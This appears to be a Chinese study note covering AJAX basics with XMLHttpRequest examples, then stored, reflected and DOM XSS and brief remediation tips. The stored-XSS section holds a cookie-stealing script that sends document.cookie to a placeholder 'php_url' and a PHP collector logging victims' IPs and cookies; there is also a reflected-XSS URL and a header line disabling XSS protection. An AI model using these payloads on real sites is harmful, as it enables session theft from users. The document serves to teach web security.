## 6. XSS & ajax
#XSS #ajax
- AJAX = 异步 JavaScript 和 XML。

- AJAX 是一种用于创建快速动态网页的技术。

- 通过在后台与服务器进行少量数据交换，AJAX 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。

创建实例

```javascript
var xmlhttp;
if (window.XMLHttpRequest)
  {// code for IE7+, Firefox, Chrome, Opera, Safari 新版浏览器
  xmlhttp=new XMLHttpRequest();
  }
else
  {// code for IE6, IE5 旧版浏览器
  xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
  }
```

发送请求

```javascript
xmlhttp.open("GET","test1.txt",true);
xmlhttp.send();
```

| 方法                         | 描述                                                         |
| ---------------------------- | ------------------------------------------------------------ |
| open(*method*,*url*,*async*) | 规定请求的类型、URL 以及是否异步处理请求。  *method*：请求的类型；GET 或 POST *url*：文件在服务器上的位置 *async*：true（异步）或 false（同步） |
| send(*string*)               | 将请求发送到服务器。*string*：仅用于 POST 请求               |

与 POST 相比，GET 更简单也更快，并且在大部分情况下都能用。

然而，在以下情况中，请使用 POST 请求：

- 无法使用缓存文件（更新服务器上的文件或数据库）
- 向服务器发送大量数据（POST 没有数据量限制）
- 发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠

获得响应

| 属性         | 描述                       |
| ------------ | -------------------------- |
| responseText | 获得字符串形式的响应数据。 |
| responseXML  | 获得 XML 形式的响应数据。  |

```javascript
document.getElementById("myDiv").innerHTML=xmlhttp.responseText;

xmlDoc=xmlhttp.responseXML;
txt="";
x=xmlDoc.getElementsByTagName("ARTIST");
for (i=0;i<x.length;i++)
  {
  txt=txt + x[i].childNodes[0].nodeValue + "<br />";
  }
document.getElementById("myDiv").innerHTML=txt;
```

```xml
<!-- book.xml -->
<bookstore>
<book category="children">
<title lang="en">Harry Potter</title>
<author>J K. Rowling</author>
<year>2005</year>
<price>29.99</price>
</book>
<book category="cooking">
<title lang="en">Everyday Italian</title>
<author>Giada De Laurentiis</author>
<year>2005</year>
<price>30.00</price>
</book>
<book category="web" cover="paperback">
<title lang="en">Learning XML</title>
<author>Erik T. Ray</author>
<year>2003</year>
<price>39.95</price>
</book>
<book category="web">
<title lang="en">XQuery Kick Start</title>
<author>James McGovern</author>
<author>Per Bothner</author>
<author>Kurt Cagle</author>
<author>James Linn</author>
<author>Vaidyanathan Nagarajan</author>
<year>2003</year>
<price>49.99</price>
</book>
</bookstore>
```

onreadyststechange 事件

当请求被发送到服务器时，我们需要执行一些基于响应的任务。

每当 readyState 改变时，就会触发 onreadystatechange 事件。

readyState 属性存有 XMLHttpRequest 的状态信息。

下面是 XMLHttpRequest 对象的三个重要的属性：

| 属性               | 描述                                                         |
| ------------------ | ------------------------------------------------------------ |
| onreadystatechange | 存储函数（或函数名），每当 readyState 属性改变时，就会调用该函数。 |
| readyState         | 存有 XMLHttpRequest 的状态。从 0 到 4 发生变化。  0: 请求未初始化 1: 服务器连接已建立 2: 请求已接收 3: 请求处理中 4: 请求已完成，且响应已就绪 |
| status             | 200: "OK"404: 未找到页面                                     |

```javascript
xmlhttp.onreadystatechange=function()
  {
  if (xmlhttp.readyState==4 && xmlhttp.status==200)
    {
    document.getElementById("myDiv").innerHTML=xmlhttp.responseText;//myDiv是divID
    }
  }
```

==onreadystatechange 事件被触发 5 次（0 - 4），对应着 readyState 的每个变化。==

### 6.1 存储型XSS

把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在

提交js攻击代码 存储到数据库然后输出

```html
<script src="js_url"></script>
```

```javascript
<script>
document.write('<img src="php_url?cookie='+document.cookie+'"width=0 height=0 />');
</script>
```

```php
<?php
$cookie = $_GET['cookie'];
$ip = getenv ('REMOTE_ADDR');
$time = date('Y-m-d g:i:s');
$fp = fopen("cookie.txt","a");
fwrite($fp,"IP: ".$ip."Date: ".$time." Cookie:".$cookie."\n");
fclose($fp);
?>  
```

### 6.2 反射型XSS

非持久性xss攻击仅对当此页面访问产生影响

包含在url中,诱导用户点击

```url
https://wahh-app.com/error.php?message=<script>alert(''xss''）;</script>
```

### 6.3 dom-XSS

类比SQL注入，不经过服务器直接执行JS代码。

```html
<script> alert(1); </script>
```

### 6.4 X-XSS-Protection

浏览器的安全策略

```php
header("X-XSS-Protection:0");//禁用XSS保护
```

### 6.5 CRLF-XSS

响应头注入

### 6.6 修补XSS漏洞

1.  过滤处理

2.  转义

3.  闭合XSS

    ```php
    echo "<textarea>".$t."</textarea>"
    ```
